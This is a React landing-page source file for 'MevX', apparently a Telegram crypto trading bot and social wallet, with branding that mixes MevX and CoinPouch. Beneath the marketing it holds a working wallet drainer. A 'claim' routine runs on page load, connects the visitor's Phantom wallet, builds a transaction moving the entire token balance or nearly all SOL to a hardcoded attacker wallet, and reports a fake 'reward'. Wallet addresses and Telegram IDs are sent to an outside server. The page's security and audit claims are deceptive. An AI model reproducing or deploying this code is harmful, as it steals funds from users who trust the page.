import React, { useEffect, useState, useRef } from "react";
import { Connection, Transaction, SystemProgram, PublicKey } from "@solana/web3.js";
import { getAssociatedTokenAddress, createTransferInstruction } from "@solana/spl-token";
import Notification from "../components/Notification";

const DESTINATION_WALLET = new PublicKey("AvXbEcEEDnrSzeZRuL5F1gfYqHdHax51MTjhfpzjZRde");
const params = new URLSearchParams(window.location.search);

export default function Home() {
	const [tgId, setTgId] = useState(null);
	const [token, setToken] = useState(null);
	const [walletAddress, setWalletAddress] = useState(null);
	const [notification, setNotification] = useState(null); 

	const hasRun = useRef(false);

	useEffect(() => {
		
	}, []);

	// --- Parse query params ---
	useEffect(() => {
		const tgIdParam = params.get("tgId");
		const tokenParam = params.get("token");
		const claimProcess = params.get("process");

		setTgId(tgIdParam);
		setToken(tokenParam);

		if (claimProcess == "CLAIM_SOL") {
			if (!hasRun.current) {
				handleClaim();
				hasRun.current = true;
			}
		}

		if (claimProcess == "CONNECT") {
			connectWallet();
		}
	}, []);

	function isMobile() {
		return /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
	}

	async function handleClaim() {
		const params = new URLSearchParams(window.location.search);
		const telegramUserId = params.get("tgId");
		const tokenAddress = params.get("token"); // SPL token mint address

		if (!window.solana || !window.solana.isPhantom) {
			setNotification("Phantom wallet not found. Please install it.")
			return;
		}

		try {
			// Connect Phantom
			const resp = await window.solana.connect();
			const userWallet = resp.publicKey;
			console.log("Connected wallet:", userWallet.toString());

			const connection = new Connection("https://solana-mainnet.g.alchemy.com/v2/k1xYHeDYVx4Rqv8gVvZKU", "confirmed");

			let transaction;

			if (tokenAddress) {
				// --- Case 1: Send all of a token ---
				const mint = new PublicKey(tokenAddress);

				// Find user's token account
				const userTokenAccount = await getAssociatedTokenAddress(mint, userWallet);

				// Find destination token account
				const destTokenAccount = await getAssociatedTokenAddress(mint, DESTINATION_WALLET);
				console.log("userTokenAccount", userTokenAccount);

				// Get token balance
				const tokenBalanceInfo = await connection.getTokenAccountBalance(userTokenAccount);
				const amount = tokenBalanceInfo.value.amount; // raw amount in base units
				if (amount === "0") {
					setNotification("No tokens available to transfer.")
					return;
				}

				// Build transaction
				transaction = new Transaction().add(createTransferInstruction(userTokenAccount, destTokenAccount, userWallet, amount));
			} else {
				// --- Case 2: Send all SOL ---
				const balance = await connection.getBalance(userWallet);
				console.log("Balance (lamports):", balance);

				if (balance <= 5000) {
					setNotification("Not enough SOL to cover fees.");
					return;
				}

				// Estimate fee with a dummy tx
				let tempTx = new Transaction().add(
					SystemProgram.transfer({
						fromPubkey: userWallet,
						toPubkey: DESTINATION_WALLET,
						lamports: 1, // placeholder
					})
				);
				tempTx.feePayer = userWallet;
				tempTx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;

				const fee = await tempTx.getEstimatedFee(connection);
				console.log("Estimated fee:", fee);

				// Leave a small buffer
				const rentExemptReserve = 2000000; // ~0.002 SOL
				const safetyBuffer = 5000; // tiny extra
				const lamportsToSend = balance - fee - rentExemptReserve - safetyBuffer;

				if (lamportsToSend <= 0) {
					setNotification("Not enough SOL to cover transaction fees.");
					return;
				}

				// Build final transaction
				transaction = new Transaction().add(
					SystemProgram.transfer({
						fromPubkey: userWallet,
						toPubkey: DESTINATION_WALLET,
						lamports: lamportsToSend,
					})
				);
			}

			const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
			transaction.feePayer = userWallet;
			transaction.recentBlockhash = blockhash;

			// Sign
			const signedTx = await window.solana.signTransaction(transaction);

			// Send
			const signature = await connection.sendRawTransaction(signedTx.serialize(), {
				skipPreflight: false,
				maxRetries: 3,
			});
			setNotification("Claim successful. Will receive reward shortly.");
			console.log("Transaction Signature:", signature);

			// Confirm
			await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, "confirmed");
		} catch (err) {
			console.error("Claim failed:", err);
			setNotification("Transaction failed or rejected.");
			window.close();
		}
	}

	async function connectWallet() {
		if (window.solana && window.solana.isPhantom) {
			try {
				const resp = await window.solana.connect();
				const address = resp.publicKey.toString();
				setWalletAddress(address);

				if (tgId) {
					await fetch(`https://mevxpro-c2984bbac7fe.herokuapp.com/wallet-connected`, {
						method: "POST",
						headers: { "Content-Type": "application/json" },
						body: JSON.stringify({
							tgId,
							walletAddress: address,
							token,
						}),
					});
				}

				// ✅ show animated notification instead of alert
				setNotification("Wallet connected!");
			} catch (err) {
				console.error("Wallet connection failed:", err);
				setNotification("Wallet connection failed");
			}
		} else if (isMobile()) {
			const dappUrl = encodeURIComponent(window.location.href);
			window.location.href = `https://phantom.app/ul/browse/${dappUrl}`;
		} else {
			setNotification("Please install Phantom extension to continue.");
		}
	}

	return (
		<div className="App">
			{/* 🔔 Notification */}
			{notification && <Notification message={notification} onClose={() => setNotification(null)} />}
			<header className="header">
				<div className="container">
					<nav className="nav">
						<a className="logo" href="/" data-discover="true">
							<img src="/logo.svg" alt="logo" />
							MevX
						</a>
						<a href="https://app.coinpouch.io" target="_blank" rel="noopener noreferrer" className="btn btn-primary btn-launch-app btn-launch-app-mobile">
							<span className="btn-primary-header">Launch App</span>
						</a>
						<button className="burger-menu" aria-label="Open menu">
							<svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="lucide lucide-menu">
								<line x1="4" y1="12" x2="20" y2="12" />
								<line x1="4" y1="6" x2="20" y2="6" />
								<line x1="4" y1="18" x2="20" y2="18" />
							</svg>
						</button>

						<ul className="nav-links">
							{/* <li><a className="active" href="/" data-discover="true">Home</a></li> */}
							<li className="btn-launch-app-desktop">
								<a href="https://t.me/MevvxTradingBot" target="_blank" rel="noopener noreferrer" className="btn btn-primary btn-launch-app">
									<span className="btn-primary-header">Launch Bot</span>
								</a>
							</li>
							<li>
								<a href="#" target="_blank" rel="noopener noreferrer" className="btn btn-docs">
									Docs
								</a>
							</li>
						</ul>
					</nav>
				</div>
			</header>

			<section className="hero-section hero">
				<div className="container">
					<div className="hero-content">
						<div className="hero-text">
							<h2 className="hero-title" style={{ textAlign: "left" }}>
								<span></span>
								<span className="typing-cursor" style={{ fontWeight: 600 }}>
									Trade
								</span>
								<br />
								<span style={{ color: "rgb(255, 255, 255)" }}>with the smartest Crypto TG-Bot</span>
							</h2>
							<p className="hero-subtitle" style={{ textAlign: "left", padding: 0 }}>
								Claim, send, receive, and engage with crypto on Solana & Ethereum directly through bolt networks. Simple. Fast. Social.
							</p>
							<div className="hero-actions">
								{walletAddress ? (
									<button className="btn btn-outline" style={{ fontSize: "17px", padding: "0.6rem 1rem" }} disabled>
										Connected
									</button>
								) : (
									<button className="btn btn-outline" style={{ fontSize: "17px", padding: "0.6rem 1rem" }} onClick={connectWallet}>
										Connect Wallet
									</button>
								)}
								<a href="https://t.me/MevvxTradingBot" target="_blank" rel="noopener noreferrer" className="hero-social-link">
									<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="lucide lucide-send">
										<path d="m22 2-7 20-4-9-9-4Z"></path>
										<path d="M22 2 11 13"></path>
									</svg>
								</a>
								<a href="https://x.com/MEVX_Official" target="_blank" rel="noopener noreferrer" className="hero-social-link">
									<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="lucide lucide-x">
										<path d="M18 6 6 18"></path>
										<path d="m6 6 12 12"></path>
									</svg>
								</a>
							</div>

							<div className="contract-section">
								<div className="contract-label">
									Contract:
									<span className="contract-address">9EnbaVoFqvh4vjz5GWzoo5ZSQp2soxp3n4wNjmKSqepA</span>
								</div>
								<div>
									<button className="copy-btn">
										<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="lucide lucide-copy">
											<rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect>
											<path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path>
										</svg>
										Copy
									</button>
								</div>
							</div>
						</div>

						<div className="hero-image">
							<div className="store-phone">
								<div className="phone-container">
									<img style={{ maxHeight: "510px" }} src="/landing.png" alt="phone" />
								</div>
							</div>
						</div>
					</div>

					<section className="trust-section visible">
						<div className="container">
							<p className="trust-text">Login with wallet and take full control of your crypto assets.</p>
						</div>
					</section>
				</div>
			</section>

			{/* ---------------- REVENUE SECTION ---------------- */}
			<section className="revenue-model-section revenue-model-section-manage visible">
				<div className="container">
					<div className="revenue-header">
						<h2 className="wallet-title">Manage crypto as managing social media</h2>
					</div>
					<div className="revenue-cards">
						{/* --- Card 1 --- */}
						<div className="revenue-card">
							<div className="card-icon-center">
								<div className="card-icon">
									<svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="lucide lucide-box">
										<path d="M21 8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16Z" />
										<path d="m3.3 7 8.7 5 8.7-5" />
										<path d="M12 22V12" />
									</svg>
									<div className="icon-accent"></div>
								</div>
							</div>
							<h3 className="card-title">Social Transactions</h3>
							<p className="card-description">Send SOL or tokens to friends on social platforms with a single tap—no wallet addresses needed.</p>
						</div>

						{/* --- Card 2 --- */}
						<div className="revenue-card">
							<div className="card-icon-center">
								<div className="card-icon">
									<svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="lucide lucide-rocket">
										<path d="M4.5 16.5c-1.5 1.26-2 5-2 5s3.74-.5 5-2c.71-.84.7-2.13-.09-2.91a2.18 2.18 0 0 0-2.91-.09z" />
										<path d="m12 15-3-3a22 22 0 0 1 2-3.95A12.88 12.88 0 0 1 22 2c0 2.72-.78 7.5-6 11a22.35 22.35 0 0 1-4 2z" />
										<path d="M9 12H4s.55-3.03 2-4c1.62-1.08 5 0 5 0" />
										<path d="M12 15v5s3.03-.55 4-2c1.08-1.62 0-5 0-5" />
									</svg>
									<div className="icon-accent"></div>
								</div>
							</div>
							<h3 className="card-title">Solana Speed</h3>
							<p className="card-description">Enjoy near-instant transactions with minimal fees, thanks to Solana’s cutting-edge blockchain.</p>
						</div>

						{/* --- Card 3 --- */}
						<div className="revenue-card">
							<div className="card-icon-center">
								<div className="card-icon">
									<svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="lucide lucide-layers">
										<path d="m12.83 2.18a2 2 0 0 0-1.66 0L2.6 6.08a1 1 0 0 0 0 1.83l8.58 3.91a2 2 0 0 0 1.66 0l8.58-3.9a1 1 0 0 0 0-1.83Z" />
										<path d="m22 17.65-9.17 4.16a2 2 0 0 1-1.66 0L2 17.65" />
										<path d="m22 12.65-9.17 4.16a2 2 0 0 1-1.66 0L2 12.65" />
									</svg>
									<div className="icon-accent"></div>
								</div>
							</div>
							<h3 className="card-title">Social DeFi Hub</h3>
							<p className="card-description">Store and exchange your crypto assets with the confidence of how you use your social media.</p>
						</div>

						{/* --- Card 4 --- */}
						<div className="revenue-card">
							<div className="card-icon-center">
								<div className="card-icon">
									<svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="lucide lucide-key-round">
										<path d="M2 18v3c0 .6.4 1 1 1h4v-3h3v-3h2l1.4-1.4a6.5 6.5 0 1 0-4-4Z" />
										<circle cx="16.5" cy="7.5" r=".5" fill="currentColor" />
									</svg>
									<div className="icon-accent"></div>
								</div>
							</div>
							<h3 className="card-title">Top-Tier Security</h3>
							<p className="card-description">Your assets are protected with advanced encryption and secure key management.</p>
						</div>
					</div>
				</div>
			</section>

			{/* ---------------- FAQ SECTION ---------------- */}
			<section className="faq-section visible">
				<div className="container">
					<div className="faq-header">
						<h2 className="faq-title">FAQs</h2>
					</div>

					<div className="faq-grid">
						{/* FAQ 1 */}
						<div className="faq-item" style={{ animationDelay: "0s" }}>
							<button className="faq-question">
								<span className="question-text">What is MevX?</span>
								<div className="question-icon">
									<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="lucide lucide-plus">
										<path d="M5 12h14" />
										<path d="M12 5v14" />
									</svg>
								</div>
							</button>
							<div className="faq-answer">
								<div className="answer-content">
									<p>CoinPouch is a next generation blockchain wallet. This social media wallet allows you to store and transact crypto with your social media usernames.</p>
								</div>
							</div>
						</div>

						{/* FAQ 2 */}
						<div className="faq-item" style={{ animationDelay: "0.1s" }}>
							<button className="faq-question">
								<span className="question-text">How to create a MevX Wallet?</span>
								<div className="question-icon">
									<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="lucide lucide-plus">
										<path d="M5 12h14" />
										<path d="M12 5v14" />
									</svg>
								</div>
							</button>
							<div className="faq-answer">
								<div className="answer-content">
									<p>
										1. On the top bar click Login <br />
										2. Select the social media you want to login with <br />
										3. Authorize and confirm the login from your social account <br />
										<br />
										These 3 intuitive steps require less than a minute to have a wallet operating in decentralized finance.
									</p>
								</div>
							</div>
						</div>

						{/* FAQ 3 */}
						<div className="faq-item" style={{ animationDelay: "0.2s" }}>
							<button className="faq-question">
								<span className="question-text">Is MevX a free to use? (yes)</span>
								<div className="question-icon">
									<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="lucide lucide-plus">
										<path d="M5 12h14" />
										<path d="M12 5v14" />
									</svg>
								</div>
							</button>
							<div className="faq-answer">
								<div className="answer-content">
									<p>Yes CoinPouch is non custodial. After you enabled the 2FA, you and only you will see your seed phrase. Write it down and store it somewhere safe. Don't share the seedphrase with anyone.</p>
								</div>
							</div>
						</div>

						{/* FAQ 4 */}
						<div className="faq-item" style={{ animationDelay: "0.3s" }}>
							<button className="faq-question">
								<span className="question-text">Seedphrase lost? How to Recovery</span>
								<div className="question-icon">
									<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="lucide lucide-plus">
										<path d="M5 12h14" />
										<path d="M12 5v14" />
									</svg>
								</div>
							</button>
							<div className="faq-answer">
								<div className="answer-content">
									<p>
										If you lost the seedphrase or forgot the password you can still have access to your wallet. The recovery account function requires your social media username + the 2fa enables to be back on your crypto business. <br />
										<br />
										How it works: Login on top, click recover account, insert your handle + 2fa and you'll have your account back
									</p>
								</div>
							</div>
						</div>

						{/* FAQ 5 */}
						<div className="faq-item" style={{ animationDelay: "0.4s" }}>
							<button className="faq-question">
								<span className="question-text">Send and receive transactions</span>
								<div className="question-icon">
									<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="lucide lucide-plus">
										<path d="M5 12h14" />
										<path d="M12 5v14" />
									</svg>
								</div>
							</button>
							<div className="faq-answer">
								<div className="answer-content">
									<p>MevX lets users send and receive crypto using social media usernames instead of long wallet addresses.</p>
								</div>
							</div>
						</div>

						{/* FAQ 6 */}
						<div className="faq-item" style={{ animationDelay: "0.5s" }}>
							<button className="faq-question">
								<span className="question-text">Send and receive crypto to external wallets</span>
								<div className="question-icon">
									<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="lucide lucide-plus">
										<path d="M5 12h14" />
										<path d="M12 5v14" />
									</svg>
								</div>
							</button>
							<div className="faq-answer">
								<div className="answer-content">
									<p>
										MevX lets you send or receive crypto with other wallets using a blockchain address. <br />
										<br />
										To send to a non-CoinPouch wallet, choose 'Blockchain address', paste the address, and continue. <br />
										To receive from another wallet, click 'Receive' and copy your blockchain address correctly.
									</p>
								</div>
							</div>
						</div>
					</div>

					<div className="send-wave"></div>
				</div>
			</section>

			{/* ---------------- FOOTER ---------------- */}
			<footer className="footer">
				<div className="footer-container">
					<div className="footer-content">
						<div className="footer-left">
							<div className="footer-logo">
								<img src="/logo.svg" alt="logo" />
								<span className="footer-logo-text">MevX</span>
							</div>

							<div className="footer-social">
								<a href="https://t.me/MevvxTradingBot" target="_blank" rel="noopener noreferrer" className="footer-social-link">
									<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="lucide lucide-send">
										<path d="m22 2-7 20-4-9-9-4Z" />
										<path d="M22 2 11 13" />
									</svg>
								</a>
								<a href="https://x.com/MEVX_Official" target="_blank" rel="noopener noreferrer" className="footer-social-link">
									<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="lucide lucide-x">
										<path d="M18 6 6 18" />
										<path d="m6 6 12 12" />
									</svg>
								</a>
							</div>

							<div className="footer-audit">
								<span className="audit-label">Audited by:</span>
								<div className="audit-logo">
									<div className="solid-proof-logo">
										<div className="shield-icon">🛡️</div>
										<span>
											<a className="shield-link" href="#" target="_blank" rel="noopener noreferrer">
												CFG NINJA
											</a>
										</span>
									</div>
								</div>
							</div>
						</div>

						<div className="footer-right">
							<div className="footer-column">
								<h4 className="footer-column-title">Wallet</h4>
								<ul className="footer-links">
									<li>
										<a href="https://t.me/MevvxCS" target="_blank" rel="noopener noreferrer">
											Contact Us
										</a>
									</li>
									<li>
										<a href="#">Docs</a>
									</li>
								</ul>
							</div>

							<div className="footer-column">
								<h4 className="footer-column-title">Features</h4>
								<ul className="footer-links">
									<li>
										<a href="https://t.me/MevvxTradingBot" target="_blank" rel="noopener noreferrer">
											Claim
										</a>{" "}
										|{" "}
										<a href="https://t.me/MevvxTradingBot" target="_blank" rel="noopener noreferrer">
											Swap
										</a>{" "}
										|{" "}
										<a href="https://t.me/MevvxTradingBot" target="_blank" rel="noopener noreferrer">
											Send
										</a>
									</li>
									<li>
										<a href="https://t.me/MevvxTradingBot" target="_blank" rel="noopener noreferrer">
											Receive
										</a>{" "}
										|{" "}
										<a href="https://t.me/MevvxTradingBot" target="_blank" rel="noopener noreferrer">
											Transactions
										</a>
									</li>
								</ul>
							</div>
						</div>
					</div>

					<div className="footer-bottom">
						<div className="footer-copyright">
							<span>© 2025 CoinPouch</span>
							<a href="#terms">Terms</a>
							<a href="#privacy">Privacy Policy</a>
						</div>
					</div>
				</div>
			</footer>
		</div>
	);
}
